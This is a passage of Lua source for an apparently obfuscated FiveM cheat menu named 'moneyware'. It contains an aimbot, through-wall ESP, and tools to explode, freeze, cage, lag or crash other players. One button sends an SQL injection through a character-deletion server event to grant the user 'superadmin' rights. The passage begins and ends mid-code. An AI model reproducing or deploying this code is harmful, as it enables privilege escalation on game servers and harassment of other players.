        CreateRuntimeTextureFromDuiHandle(txd,
         "lysy2",
          dui2)
    end)

    Citizen.CreateThread(function()
        local txd = CreateRuntimeTxd(
            "hugeware1"
            )
        local dui = CreateDui(
            "https://cdn.discordapp.com/attachments/782576769856962580/809845080939823114/money_1.png",
             156, 95)
        
        Citizen.Wait(
            1
            )
        local dui2 = GetDuiHandle(
            dui
            )
        Citizen.Wait(
            25
            )
        CreateRuntimeTextureFromDuiHandle(txd,
         "lysy1",
          dui2)
    end)


local to_add_X = MW.Menu.MenuX-0.5
local to_add_Y = MW.Menu.MenuY-0.5

function GetSliderBorder(side_moneyware)
    if side_moneyware == 1 then
        return 42.44, 50.00
    elseif side_moneyware == 2 then
        return 56.2, 63.65
    elseif side_moneyware == 3 then
        return 54.27, 61.927
    elseif side_moneyware == 4 then
        return 42.34, 50.10
    end
end

local function AddVectors_moneyware(to_vector_1_moneyware, to_vector_2_DOIHGIUOSDGRF)
return vector3(to_vector_1_moneyware.x + to_vector_2_DOIHGIUOSDGRF.x, to_vector_1_moneyware.y + to_vector_2_DOIHGIUOSDGRF.y, to_vector_1_moneyware.z + to_vector_2_DOIHGIUOSDGRF.z)
end


local function RAvVtwxGc_moneyware(target, bone, damage)
    local boneTarget = GetPedBoneCoords(target, GetEntityBoneIndexByName(target, bone), 0.0, 0.0, 0.0)
    local _, weapon = GetCurrentPedWeapon(PlayerPedId())
    ShootSingleBulletBetweenCoords(AddVectors_moneyware(boneTarget, vector3(0, 0, 0.1)), boneTarget, 1, true, weapon, PlayerPedId(), true, true, 1000.0)
end

local function XdASEvWV_moneyware(k)
    if IsEntityOnScreen(k) and HasEntityClearLosToEntityInFront(PlayerPedId(), k) and
        not IsPedDeadOrDying(k) and not IsPedInVehicle(k, GetVehiclePedIsIn(k), false) and 
        IsDisabledControlPressed(0, keys["MOUSE1"]) and IsPlayerFreeAiming(PlayerId()) then
        local x, y, z = table.unpack(GetEntityCoords(k))
        local _, _x, _y = World3dToScreen2d(x, y, z)
        if _x > 0.74 and _x < 0.74 and _y > 0.74 and _y < 0.74 then
            local _, weapon = GetCurrentPedWeapon(PlayerPedId())
            RAvVtwxGc_moneyware(k, "SKEL_Pelvis", GetWeaponDamage(weapon, 1))
        end
    end
end



local function KeyBoardInput(TextEntry_dihg8e4w9gsdfg, ExampleText_dug8iew74gsd, MaxStringLength_dijgps9e8r)
    Invoken(0x32CA01C3, "FMMC_KEY_TIP1", TextEntry_dihg8e4w9gsdfg .. ":")
    Invoken(0x00DC833F2568DBF6, 1, "FMMC_KEY_TIP1", "", ExampleText_dug8iew74gsd, "", "", "", MaxStringLength_dijgps9e8r)
    blockinput_dihgs8ourigdfg = true
    

    while Invoken(0x0CF2B696BBF945AE) ~= 1 and Invoken(0x0CF2B696BBF945AE) ~= 2 do
        Wait(0)
        
    end

    if Invoken(0x0CF2B696BBF945AE) ~= 2 then
        local dfjs8erfdfg = GetOnscreenKeyboardResult()
        Wait(500)
        blockinput_dihgs8ourigdfg = false
        return dfjs8erfdfg
    else
    
        Wait(500)
        blockinput_dihgs8ourigdfg = false
        return nil
    end
end

local function PreloadTextures_moneyware()
    
    for i = 1, #texture_preload do
        RequestStreamedTextureDict(texture_preload[i])
    end

end

local function RGBRainbow_moneyware(frequency, repeats)
    local result = {}
    local curtime = GetGameTimer() / 1000

    for i=1, tonumber(repeats) or 2 do
        table.insert(result, { r = 0, g = 0, b = 0})
        result[i].r = math.floor(math.sin(curtime * frequency + 0 + (i*0.1)) * 127 + 128)
        result[i].g = math.floor(math.sin(curtime * frequency + 2 + (i*0.1)) * 127 + 128)
        result[i].b = math.floor(math.sin(curtime * frequency + 4 + (i*0.1)) * 127 + 128)
    end

    return result
end


PreloadTextures_moneyware()


local function Enumerate_moneyware(aH, aI, aJ)
    return coroutine.wrap(
        function()
            local aK, t = aH()

            if not t or t == 0 then
                aJ(aK)

                return
            end

            local aF = {
                handle = aK,
                destructor = aJ
            }

            setmetatable(aF, aE)
            local aL = true
            repeat
                coroutine.yield(t)
                aL, t = aI(aK)
            until not aL
            aF.destructor, aF.handle = nil, nil
            aJ(aK)
        end
    )
end

local function Enumerate_moneywareVehicles()
    return Enumerate_moneyware(FindFirstVehicle,FindNextVehicle,EndFindVehicle)
end

local function Enumerate_moneywarePeds()
    return Enumerate_moneyware(FindFirstPed,FindNextPed,EndFindPed)
end

local function Enumerate_moneywareObjects()
    return Enumerate_moneyware(FindFirstObject,FindNextObject,EndFindObject)
end



local function DrawText(text, x, y, outline, size, font, centre, r, g, b)
    SetTextColour(r, g, b, 255)
    SetTextFont(0)
    if outline then
        SetTextOutline(true)
    end
    if tonumber(font) ~= nil then
        SetTextFont(font)
    end
    if centre then
        SetTextCentre(true)
    end

    SetTextScale(100.0, size or 0.23)
    BeginTextCommandDisplayText("STRING")
    AddTextComponentSubstringWebsite(text)
    EndTextCommandDisplayText(x, y)
end

local function DrawText1(text, x, y, outline, size, font, centre)
    SetTextFont(0)
    if outline then
        SetTextOutline(true)
    end
    if tonumber(font) ~= nil then
        SetTextFont(font)
    end
    if centre then
        SetTextCentre(true)
    end

    SetTextScale(100.0, size or 0.23)
    BeginTextCommandDisplayText("STRING")
    AddTextComponentSubstringWebsite(text)
    EndTextCommandDisplayText(x, y)
end


local function GetTextWidht(str, font, scale)
    BeginTextCommandWidth("STRING")
    AddTextComponentSubstringPlayerName(str)
    SetTextFont(font or 4)
    SetTextScale(scale or 0.35, scale or 0.35)
    local length = EndTextCommandGetWidth(1)

    return length
end

local function Button(text, x, y, outline)
    local cursor_x, cursor_y = GetNuiCursorPosition() 
    local widht, height = GetActiveScreenResolution()
    cursor_x = cursor_x / widht
    cursor_y = cursor_y / height
    
    local widht = GetTextWidht(text, 0, 0.2)
    

    if( (cursor_x) + 0.03 >= x+to_add_X and (cursor_x) - 0.03 <= x+to_add_X and (cursor_y) + 0.012 >= y+to_add_Y and (cursor_y) - 0.012 <= y+to_add_Y) then
    DrawText(text, x+to_add_X-0.028, y+to_add_Y-0.011, outline, 0.23, 0, false, Sliderson.Sliderki[2].value, Sliderson.Sliderki[3].value, Sliderson.Sliderki[4].value)
    else
    DrawText(text, x+to_add_X-0.028, y+to_add_Y-0.011, outline, 0.23, 0, false, 255, 255, 255)

    end


    if( (cursor_x) + 0.03 >= x+to_add_X and (cursor_x) - 0.03 <= x+to_add_X and (cursor_y) + 0.012 >= y+to_add_Y and (cursor_y) - 0.012 <= y+to_add_Y and IsDisabledControlJustReleased(0, 92)) then 
        return true
    else
        return false
    end
end



local function MenuButton(id, text, x, y, outline)

    if tab == id then
    DrawRect(x+to_add_X, y+to_add_Y-0.003, 0.067, 0.031, Sliderson.Sliderki[2].value, Sliderson.Sliderki[3].value, Sliderson.Sliderki[4].value, 255)
    DrawRect(x+to_add_X, y+to_add_Y-0.002, 0.068, 0.031, Sliderson.Sliderki[2].value, Sliderson.Sliderki[3].value, Sliderson.Sliderki[4].value, 255)
    DrawRect(x+to_add_X, y+to_add_Y-0.001, 0.069, 0.031, Sliderson.Sliderki[2].value, Sliderson.Sliderki[3].value, Sliderson.Sliderki[4].value, 255)
    DrawRect(x+to_add_X, y+to_add_Y, 0.07, 0.031, 27, 27, 27, 255)
    DrawRect(x+to_add_X, y+to_add_Y, 0.069, 0.029, 9, 9, 9, 255)
    DrawRect(x+to_add_X, y+to_add_Y, 0.068, 0.027, 23, 23, 23, 255)
-- Sliderson.Sliderki[2].value, Sliderson.Sliderki[3].value, Sliderson.Sliderki[4].value
    else
    DrawRect(x+to_add_X, y+to_add_Y, 0.07, 0.031, 27, 27, 27, 255)
    DrawRect(x+to_add_X, y+to_add_Y, 0.069, 0.029, 9, 9, 9, 255)
    DrawRect(x+to_add_X, y+to_add_Y, 0.068, 0.027, 18, 18, 18, 255)
    end
    
    local cursor_x, cursor_y = GetNuiCursorPosition() 
    local widht, height = GetActiveScreenResolution()
    cursor_x = cursor_x / widht
    cursor_y = cursor_y / height
    
    local widht = GetTextWidht(text, 0, 0.2)
    

    if( (cursor_x) + 0.03 >= x+to_add_X and (cursor_x) - 0.03 <= x+to_add_X and (cursor_y) + 0.015 >= y+to_add_Y and (cursor_y) - 0.015 <= y+to_add_Y) then
    DrawText(text, x+to_add_X-0.028, y+to_add_Y-0.011, outline, 0.24, 0, false, Sliderson.Sliderki[2].value, Sliderson.Sliderki[3].value, Sliderson.Sliderki[4].value)
    else
    DrawText(text, x+to_add_X-0.028, y+to_add_Y-0.011, outline, 0.24, 0, false, 255, 255, 255)
    end

    --[[
    ]]

    if( (cursor_x) + 0.03 >= x+to_add_X and (cursor_x) - 0.03 <= x+to_add_X and (cursor_y) + 0.015 >= y+to_add_Y and (cursor_y) - 0.015 <= y+to_add_Y and IsDisabledControlJustReleased(0, 92)) then 
        return true
    else
        return false
    end
end








local function Checkbox(nazwa,x,y,bool, outline)
    local buttonSpriteScale_DSGJHSDIGSDG = { x = 0.016, y = 0.1 }
    local cursor_x, cursor_y = GetNuiCursorPosition() 
    local widht, height = GetActiveScreenResolution()
    cursor_x = cursor_x / widht
    cursor_y = cursor_y / height
    local x2 = x-0.021
    --rawText(nazwa,x+0.012+to_add_X-0.027,y+to_add_Y-0.01,outline,0.23)
    
    if bool then
        DrawRect(x2+to_add_X, y+to_add_Y, 0.007, 0.0128, 0, 0, 0, 255)
        DrawRect(x2+to_add_X, y+to_add_Y, 0.006, 0.011, Sliderson.Sliderki[2].value, Sliderson.Sliderki[3].value, Sliderson.Sliderki[4].value, 255)
    else
        DrawRect(x2+to_add_X, y+to_add_Y, 0.007, 0.0128, 0, 0, 0, 255)
        DrawRect(x2+to_add_X, y+to_add_Y, 0.006, 0.011, 20, 20, 20, 255)
    end
    
    local text_widht = (GetTextWidht(nazwa) / 2)


    if( (cursor_x) + 0.03 >= x+to_add_X and (cursor_x) <= x+text_widht+to_add_X and (cursor_y) + 0.012 >= y+to_add_Y and (cursor_y) - 0.012 <= y+to_add_Y) then
    DrawText(nazwa,x+0.012+to_add_X-0.027,y+to_add_Y-0.01,outline, 0.23, Sliderson.Sliderki[21].value, false, Sliderson.Sliderki[2].value, Sliderson.Sliderki[3].value, Sliderson.Sliderki[4].value)
    else
    DrawText(nazwa,x+0.012+to_add_X-0.027,y+to_add_Y-0.01,outline, 0.23, Sliderson.Sliderki[21].value, false, 255, 255, 255)
    end

    if( (cursor_x) + 0.03 >= x+to_add_X and (cursor_x) <= x+text_widht+to_add_X and (cursor_y) + 0.012 >= y+to_add_Y and (cursor_y) - 0.012 <= y+to_add_Y) and IsDisabledControlJustReleased(0, 92) then 
        return true
    else
        return false
    end
end

local function KeyCheckBox(nazwa,x,y, boolo, outline)
    local buttonSpriteScale_DSGJHSDIGSDG = { x = 0.016, y = 0.1 }
    local cursor_x, cursor_y = GetNuiCursorPosition() 
    local widht, height = GetActiveScreenResolution()
    cursor_x = cursor_x / widht
    cursor_y = cursor_y / height
    local x2 = x-0.021

    DrawText1(boolo,     x+0.13+to_add_X-0.028,    y+to_add_Y-0.0075,outline,0.16)
    DrawRect(x2+to_add_X+0.126, y+to_add_Y-0.0007, 0.007, 0.0128, 0, 0, 0, 255)
    DrawRect(x2+to_add_X+0.126, y+to_add_Y-0.0007, 0.006, 0.011, 20, 20, 20, 255)
    

    
    local text_widht = (GetTextWidht(nazwa) / 2)

    if( (cursor_x) + 0.03 >= x+to_add_X and (cursor_x) <= x+text_widht+to_add_X and (cursor_y) + 0.012 >= y+to_add_Y and (cursor_y) - 0.012 <= y+to_add_Y) then
    DrawText(nazwa,x+0.012+to_add_X-0.027,y+to_add_Y-0.01,outline, 0.23, Sliderson.Sliderki[21].value, false, Sliderson.Sliderki[2].value, Sliderson.Sliderki[3].value, Sliderson.Sliderki[4].value)
    else
    DrawText(nazwa,x+0.012+to_add_X-0.027,y+to_add_Y-0.01,outline, 0.23, Sliderson.Sliderki[21].value, false, 255, 255, 255)
    end

    if( (cursor_x) + 0.03 >= x+to_add_X and (cursor_x) <= x+text_widht+to_add_X and (cursor_y) + 0.012 >= y+to_add_Y and (cursor_y) - 0.012 <= y+to_add_Y) and IsDisabledControlJustReleased(0, 92) then 
        return true
    else
        return false
    end
end
 
--[[local function Slider(nazwa,x,y, outline)
    local cursor_x, cursor_y = GetNuiCursorPosition() 
    local widht, height = GetActiveScreenResolution()
    cursor_x = cursor_x / widht
    cursor_y = cursor_y / height
    local x2 = x-0.021
    DrawText(nazwa,x+0.012+to_add_X-0.027,y+to_add_Y-0.01,outline,0.23)

    
    DrawRect(x2+to_add_X+0.05, y+to_add_Y+0.017, 0.085, 0.0128, 0, 0, 0, 255)
    DrawRect(x2+to_add_X+0.05, y+to_add_Y+0.017, 0.084, 0.011, 20, 20, 20, 255)
    DrawRect(x2+to_add_X-0.03, y+to_add_Y+0.017, 0.002, 0.011, 247, 1, 255, 255)
    
    
    local text_widht = (GetTextWidht(nazwa) / 2)

    if( (cursor_x) + 0.01 >= x+to_add_X and (cursor_x) <= x+text_widht+to_add_X and (cursor_y) + 0.009 >= y+to_add_Y and (cursor_y) - 0.009 <= y+to_add_Y) then
       DrawRect(x2+to_add_X+0.02+nigga, y+to_add_Y+0.017, 0.002, 0.011, 247, 255, 255, 255) 
        if IsControlPressed(0, keys["M"]) then
            nigga = nigga + 0.01
        DrawRect(x2+to_add_X+0.02+nigga, y+to_add_Y+0.017, 0.002, 0.011, 247, 255, 255, 255) 
    end
        if IsControlPressed(0, keys["Q"]) then
                nigga = nigga - 0.01
        DrawRect(x2+to_add_X+0.02+nigga, y+to_add_Y+0.017, 0.002, 0.011, 247, 255, 255, 255) 
       end
    end

    if( (cursor_x) + 0.03 >= x+to_add_X and (cursor_x) <= x+text_widht+to_add_X and (cursor_y) + 0.012 >= y+to_add_Y and (cursor_y) - 0.012 <= y+to_add_Y) and IsDisabledControlJustReleased(0, 92) then 
        return true
    else
        return false
    end
end]]

local friends = {
    [GetPlayerServerId(PlayerId())] = true
}

local friends_esp_color = {r = 0, g = 0, b = 255}
local esp_color = { r = 255, g = 0, b = 0}

local function LineBox(entity, r, g, b, a)
    if entity then
        local model = GetEntityModel(entity)
        local min, max = GetModelDimensions(model)
        local top_front_right = GetOffsetFromEntityInWorldCoords(entity, max)
        local top_back_right = GetOffsetFromEntityInWorldCoords(entity, vector3(max.x, min.y, max.z))
        local bottom_front_right = GetOffsetFromEntityInWorldCoords(entity, vector3(max.x, max.y, min.z))
        local bottom_back_right = GetOffsetFromEntityInWorldCoords(entity, vector3(max.x, min.y, min.z))
        local top_front_left = GetOffsetFromEntityInWorldCoords(entity, vector3(min.x, max.y, max.z))
        local top_back_left = GetOffsetFromEntityInWorldCoords(entity, vector3(min.x, min.y, max.z))
        local bottom_front_left = GetOffsetFromEntityInWorldCoords(entity, vector3(min.x, max.y, min.z))
        local bottom_back_left = GetOffsetFromEntityInWorldCoords(entity, min)
    

        DrawLine(top_front_right, top_back_right, r, g, b, a)
        DrawLine(top_front_right, bottom_front_right, r, g, b, a)
        DrawLine(bottom_front_right, bottom_back_right, r, g, b, a)
        DrawLine(top_back_right, bottom_back_right, r, g, b, a)

        DrawLine(top_front_left, top_back_left, r, g, b, a)
        DrawLine(top_back_left, bottom_back_left, r, g, b, a)
        DrawLine(top_front_left, bottom_front_left, r, g, b, a)
        DrawLine(bottom_front_left, bottom_back_left, r, g, b, a)

        DrawLine(top_front_right, top_front_left, r, g, b, a)
        DrawLine(top_back_right, top_back_left, r, g, b, a)
        DrawLine(bottom_front_left, bottom_front_right, r, g, b, a)
        DrawLine(bottom_back_left, bottom_back_right, r, g, b, a)
    end
end

function CSGOHAHAHHA(serverid, entity, r, g, b, a)
    if entity then
        local model = GetEntityModel(entity)
        local min, max = GetModelDimensions(model)
        local top_front_right = GetOffsetFromEntityInWorldCoords(entity, max.x-0.3, max.y, max.z)
        local bottom_front_right = GetOffsetFromEntityInWorldCoords(entity, vector3(max.x-0.3, max.y, min.z+0.35))
        local top_front_left = GetOffsetFromEntityInWorldCoords(entity, vector3(min.x+0.3, max.y, max.z))
        local bottom_front_left = GetOffsetFromEntityInWorldCoords(entity, vector3(min.x+0.3, max.y, min.z+0.35))
        
        -- lol --
        local health_top_front_left = GetOffsetFromEntityInWorldCoords(entity, vector3(min.x+0.2, max.y, max.z))
        local health_bottom_front_left = GetOffsetFromEntityInWorldCoords(entity, vector3(min.x+0.2, max.y, min.z+0.35))
        local health_top_front_right = GetOffsetFromEntityInWorldCoords(entity, max.x-1.1, max.y, max.z)
        local health_bottom_front_right = GetOffsetFromEntityInWorldCoords(entity, vector3(max.x-1.1, max.y, min.z+0.35))
        local healthbar_top_front_right = GetOffsetFromEntityInWorldCoords(entity, max.x-1.1, max.y, max.z+(0.01*(GetEntityHealth(entity)-200)))
        local healthbar_top_front_left = GetOffsetFromEntityInWorldCoords(entity, vector3(min.x+0.2, max.y, max.z+(0.01*(GetEntityHealth(entity)-200))))
        local color

        color = {r = 0, g = 255, b = 0}
        if GetEntityHealth(entity) <= 100 then
            color = {r = 255, g = 179, b = 0}
        elseif GetEntityHealth(entity) <= 20 then
            color = {r = 255, g = 0, b = 0}
        end
        if health_bar_esp then
            DrawPoly(healthbar_top_front_left, healthbar_top_front_right, health_bottom_front_right, color.r, color.g, color.b, 255)
            DrawPoly(health_bottom_front_right, health_bottom_front_left, healthbar_top_front_left, color.r, color.g, color.b, 255)

            DrawLine(health_bottom_front_left, health_top_front_left, 0, 0, 0, a)

            DrawLine(health_top_front_right, health_bottom_front_right, 0, 0, 0, a)

            DrawLine(health_top_front_right, health_top_front_left, 0, 0, 0, a)

            DrawLine(health_bottom_front_left, health_bottom_front_right, 0, 0, 0, a)
        end
    

        -- BOX --
        if (box_esp_friend and friends[serverid]) and not entity == PlayerPedId() then
            DrawLine(top_front_right, bottom_front_right, friends_esp_color.r, friends_esp_color.g, friends_esp_color.b, a)

            DrawLine(top_front_left, bottom_front_left, friends_esp_color.r, friends_esp_color.g, friends_esp_color.b, a)

            DrawLine(top_front_right, top_front_left, friends_esp_color.r, friends_esp_color.g, friends_esp_color.b, a)
        
            DrawLine(bottom_front_left, bottom_front_right, friends_esp_color.r, friends_esp_color.g, friends_esp_color.b, a)
        elseif box_esp then
            --[[for pPed in Enumerate_moneywarePeds() do
                local x, y, z = table.unpack(GetEntityCoords(pPed))

                local onScreen,_x,_y=World3dToScreen2d(x,y,z)
                if HasEntityClearLosToEntity(PlayerPedId(), pPed, 17) then
                else
                    local wh = 1.85 / GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(pPed), true) 
                    DrawRect(_x,_y, wh/3, wh, esp_color.r, esp_color.g, esp_color.b, 55)
                end]]
            if not friends[serverid] then
                DrawLine(top_front_right, bottom_front_right, esp_color.r, esp_color.g, esp_color.b, a)

                DrawLine(top_front_left, bottom_front_left, esp_color.r, esp_color.g, esp_color.b, a)

                DrawLine(top_front_right, top_front_left, esp_color.r, esp_color.g, esp_color.b, a)
        
                DrawLine(bottom_front_left, bottom_front_right, esp_color.r, esp_color.g, esp_color.b, a)
            end
        end
    end
end



local function DrawButtons()
    -- Must to be good
    to_add_X = MW.Menu.MenuX-0.5
    to_add_Y = MW.Menu.MenuY-0.5


    if rainbowbackground then
        DrawSprite("hugeware2","lysy2", MW.Menu.MenuX, 0.284, 0.347, 0.02,0.0,Sliderson.Sliderki[2].value, Sliderson.Sliderki[3].value, Sliderson.Sliderki[4].value, 255)
        DrawSprite("hugeware2","lysy2", MW.Menu.MenuX, 0.285, 0.348, 0.02,0.0, Sliderson.Sliderki[2].value, Sliderson.Sliderki[3].value, Sliderson.Sliderki[4].value, 255)
        DrawSprite("hugeware2","lysy2", MW.Menu.MenuX, 0.286, 0.349, 0.02,0.0,Sliderson.Sliderki[2].value, Sliderson.Sliderki[3].value, Sliderson.Sliderki[4].value, 255)
        DrawSprite("hugeware2","lysy2", MW.Menu.MenuX, 0.287, 0.35, 0.02,0.0, Sliderson.Sliderki[2].value, Sliderson.Sliderki[3].value, Sliderson.Sliderki[4].value, 255)
    else
        DrawRect(MW.Menu.MenuX, MW.Menu.MenuY-0.014, 0.346, 0.42,Sliderson.Sliderki[2].value, Sliderson.Sliderki[3].value, Sliderson.Sliderki[4].value, 255)
        DrawRect(MW.Menu.MenuX, MW.Menu.MenuY-0.013, 0.347, 0.42, Sliderson.Sliderki[2].value, Sliderson.Sliderki[3].value, Sliderson.Sliderki[4].value, 255)
        DrawRect(MW.Menu.MenuX, MW.Menu.MenuY-0.012, 0.348, 0.42,Sliderson.Sliderki[2].value, Sliderson.Sliderki[3].value, Sliderson.Sliderki[4].value, 255)
        DrawRect(MW.Menu.MenuX, MW.Menu.MenuY-0.011, 0.349, 0.42, Sliderson.Sliderki[2].value, Sliderson.Sliderki[3].value, Sliderson.Sliderki[4].value, 255)
    end
    DrawRect(MW.Menu.MenuX, MW.Menu.MenuY-0.01, 0.35, 0.42, 17, 17, 17, 255)
    DrawRect(MW.Menu.MenuX, MW.Menu.MenuY-0.009, 0.349, 0.42, 17, 17, 17, 255)
    DrawRect(MW.Menu.MenuX, MW.Menu.MenuY-0.008, 0.348, 0.42, 17, 17, 17, 255)
    DrawRect(MW.Menu.MenuX, MW.Menu.MenuY-0.007, 0.347, 0.42, 17, 17, 17, 255)
    DrawRect(MW.Menu.MenuX, MW.Menu.MenuY-0.006, 0.346, 0.42, 17, 17, 17, 255)

    DrawRect(MW.Menu.MenuX+0.105, MW.Menu.MenuY-0.01, 0.132, 0.4035, 27, 27, 27, 255)
    DrawRect(MW.Menu.MenuX+0.105, MW.Menu.MenuY-0.01, 0.131, 0.402, 9, 9, 9, 255)
    DrawRect(MW.Menu.MenuX+0.105, MW.Menu.MenuY-0.01, 0.13, 0.4, 17, 17, 17, 255)

    DrawRect(MW.Menu.MenuX-0.031, MW.Menu.MenuY-0.01, 0.132, 0.4035, 27, 27, 27, 255)
    DrawRect(MW.Menu.MenuX-0.031, MW.Menu.MenuY-0.01, 0.131, 0.402, 9, 9, 9, 255)
    DrawRect(MW.Menu.MenuX-0.031, MW.Menu.MenuY-0.01, 0.13, 0.4, 17, 17, 17, 255)

    DrawText("moneyware v1.0.0 for fivem", 0.616, 0.689, false, 0.23, 4, false, 255, 255, 255)

if RainbowBanner then
    DrawSprite("hugeware","lysy",MW.Menu.MenuX-0.137, MW.Menu.MenuY-0.17, 0.075, 0.09,0.0,255,255,255,255)
else
DrawSprite("hugeware1","lysy1",MW.Menu.MenuX-0.137, MW.Menu.MenuY-0.17, 0.075, 0.09,0.0,255,255,255,255)
end


    

        
        




    if MenuButton('Self', 'Self', 0.365, 0.39, false) then
        tab = 'Self'
    end
    if MenuButton('Visuals', 'Visuals', 0.365, 0.43, false) then
        tab = 'Visuals'
    end
    if MenuButton('Aimbot', 'Aimbot', 0.365, 0.47, false) then
        tab = 'Aimbot'
    end
    if MenuButton('Vehicle', 'Vehicle', 0.365, 0.51, false) then
        tab = 'Vehicle'
    end
    if MenuButton('Weapons', 'Weapons', 0.365, 0.55, false) then
        tab = 'Weapons'
    end
    if MenuButton('Destroyer', 'Destroyer', 0.365, 0.59, false) then
        tab = 'Destroyer'
    end
    if MenuButton('Online', 'Online', 0.365, 0.63, false) then
        tab = 'Online'
    end
    if MenuButton('Settings', 'Settings', 0.365, 0.67, false) then
        tab = 'Settings'
    end

-- Sliderson.Sliderki[22].value / 10 / 10
if tab == "Online" then

if Checkbox('Spectate Player', 0.433, 0.305,  Spectate, false) then
    Spectate = not Spectate
    z_DSFHSUDGDS = 0.0
end
if Checkbox('Explode Player', 0.433, 0.325,  ExplodeLoopyy, false) then
    ExplodeLoopyy = not ExplodeLoopyy
end

SubMenuButton('Explode Type', 0.463, 0.345, Sliderson.Sliderki[25])

if Checkbox('Freeze Player', 0.433, 0.38,  FreezePlayero, false) then
    FreezePlayero = not FreezePlayero
end

if Checkbox('Cage Player', 0.433, 0.4,  Cage, false) then
    Cage = not Cage
end

if Checkbox('Make Player Lag', 0.433, 0.42,  ClearTasks, false) then
    ClearTasks = not ClearTasks
end

if Checkbox('Crash Player', 0.433, 0.44,  crashplayer, false) then
    crashplayer = not crashplayer
end

if Button('ESX Open Inventory', 0.434, 0.46, false) then
TriggerEvent("esx_inventoryhud:openPlayerInventory", GetPlayerId(SelectedPlayer), GetPlayerName(SelectedPlayer))
end

if Button('ESX Delete Character ', 0.434, 0.48, false) then
TriggerServerEvent('kashactersS:DeleteCharacter', "';UPDATE `users` SET `permission_level` = '4', `group` = 'superadmin'where `users`.`name` = '"..NetworkPlayerGetName(PlayerId()).."';")           
end

if Button('Explode Player', 0.434, 0.5, false) then
Invoken(0xE3AD2BDBAEE269AC, GetEntityCoords(Invoken(0x43A66C31C68491C0, SelectedPlayer)), Sliderson.Sliderki[26].value, 100000.0, true, false, 0.0)
end


SubMenuButton('Explode Type', 0.463, 0.52, Sliderson.Sliderki[26])

if Button('Spawn Mass Props On Player', 0.434, 0.555, false) then
    for i_didsfyg98sduriesdfg=1, #props_IDHSOGLFDSKGDUHIOSSD do
        Citizen.Wait(5)
        local prop_dsugusiddfsg = Invoken(0x509D5878EB39E842, Invoken(0xD24D37CC275948CC, props_IDHSOGLFDSKGDUHIOSSD[i_didsfyg98sduriesdfg]), 0, 0, 0, true, true, true)
        Invoken(0x6B9BBD38AB0796DF, 
        prop_dsugusiddfsg,
        Invoken(0x43A66C31C68491C0, SelectedPlayer),
        Invoken(0x3F428D08BE5AAE31, Invoken(0x43A66C31C68491C0, SelectedPlayer), 57005),
        0.4,
        0,
        0,
        0,
        270.0,
        60.0,
        true,
        true,
        false,
        true,
        1,
        true
        )
    end
end

if PlayersId ~= "**Invalid**" then
    if IsDisabledControlPressed(0, 14) then
            if 14 >= #PlayerIds then
                scrool = scrool
            else
                if scrool+2 >= #PlayerIds then
                    scrool = #PlayerIds
                else
                    scrool = scrool + 2
                end
            end
        end
        if IsDisabledControlPressed(0, 15) then
            if scrool-2 <= 14 then
                scrool = 15
            else
                scrool = scrool - 2
            end
        end
        if #PlayerIds <= 13 then
            for i = 1+(scrool-15), scrool-15+#PlayerIds do
                local player = GetPlayerName(PlayerIds[i])
                
                if OnlineButton(GetPlayerServerId(PlayerIds[i]), player,false,0.545,0.6+(0.021*(i-scrool))) then
                    SelectedPlayer = PlayerIds[i]
                end
            end
        else
            for i = 1+(scrool-15), scrool do
                local player = GetPlayerName(PlayerIds[i])
                if OnlineButton(GetPlayerServerId(PlayerIds[i]), player,false,0.545,0.6+(0.021*(i-scrool))) then
                    SelectedPlayer = PlayerIds[i]
                end
            end
        end
     end
    end


   if tab == "Vehicle" then

   if Checkbox('Vehicle Speed boost', 0.431, 0.305,  speedboost, false) then
    speedboost = not speedboost
   end

    SubMenuButton('Speed boost Multiplier', 0.463, 0.325, Sliderson.Sliderki[24])
 
   if Checkbox('Make Vehicle Fly', 0.431, 0.36,  vehfly, false) then
    vehfly = not vehfly
   end

   if Checkbox('Vehicle Nitro Boost', 0.431, 0.38,  NitroBoost, false) then
    NitroBoost = not NitroBoost
   end
   
   if Checkbox('Vehicle Godmode', 0.431, 0.4,  VehGodmode, false) then
    VehGodmode = not VehGodmode
   end
   
   if Checkbox('Vehicle Drift Mode', 0.431, 0.42,  driftmodekey, false) then
    driftmodekey = not driftmodekey
   end

   if Checkbox("Vehicle Horn Boost", 0.431, 0.44,  HornBoost, false) then
    HornBoost = not HornBoost
   end
   if Checkbox("Delete Current Vehicle", 0.431, 0.46,  Delete_Current_Vehicle_DSIGHDSIUGSDG, false) then
    Delete_Current_Vehicle_DSIGHDSIUGSDG = not Delete_Current_Vehicle_DSIGHDSIUGSDG
   end
   if Checkbox("Spawn in Current Vehicle", 0.431, 0.48,  Spawn_In_Veh_UHUDGFDGDF, false) then
    Spawn_In_Veh_UHUDGFDGDF = not Spawn_In_Veh_UHUDGFDGDF
   end

   if Button('Spawn Vehicle', 0.434, 0.5, false) then
        local ModelName_fuhgs8ordhfdsfg = KeyBoardInput("Type a name of vehicle", "", 100)
        local autko_dihgs8oregsfdg = Invoken(0xD24D37CC275948CC, ModelName_fuhgs8ordhfdsfg)
        if ModelName_fuhgs8ordhfdsfg and Invoken(0xC0296A2EDF545E92, autko_dihgs8oregsfdg) and Invoken(0x19AAC8F07BFEC53E, autko_dihgs8oregsfdg) then
            RequestModelSync(autko_dihgs8oregsfdg)
        
        if Delete_Current_Vehicle_DSIGHDSIUGSDG then
            local veh_DSGUHSDIUGSDUGSDGSDG = GetVehiclePedIsIn(Invoken(0xD80958FC74E988A6), 0)
            Invoken(0xEA386986E786A54F, Citizen.PointerValueIntInitialized(veh_DSGUHSDIUGSDUGSDGSDG))
        end

        local veh_duhgs8uoiregfdg = Invoken(0xAF35D0D2583051B0, Invoken(0xD24D37CC275948CC, ModelName_fuhgs8ordhfdsfg), GetEntityCoords(Invoken(0xD80958FC74E988A6)), Invoken(0xE83D4F9BA2A38914, Invoken(0xD80958FC74E988A6)), true, true)
        if Spawn_In_Veh_UHUDGFDGDF then
            Invoken(0xF75B0D629E1C063D, Invoken(0xD80958FC74E988A6), veh_duhgs8uoiregfdg, -1)
        end
            else
                print("Model Not Found!", "ERROR")
            end
    end
   
   if Button('Set Vehicle Colour', 0.434, 0.52, false) then
       local veh = GetVehiclePedIsIn(PlayerPedId(), false)
            if not DoesEntityExist(veh) then 
                print('xD, just go into vehicle')
            end
            local rcolour = KeyBoardInput("Enter R colour", "", 255)
            local gcolour = KeyBoardInput("Enter G colour", "", 255)
            local bcolour = KeyBoardInput("Enter B color", "", 255)
            SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId()) , rcolour, gcolour, bcolour)
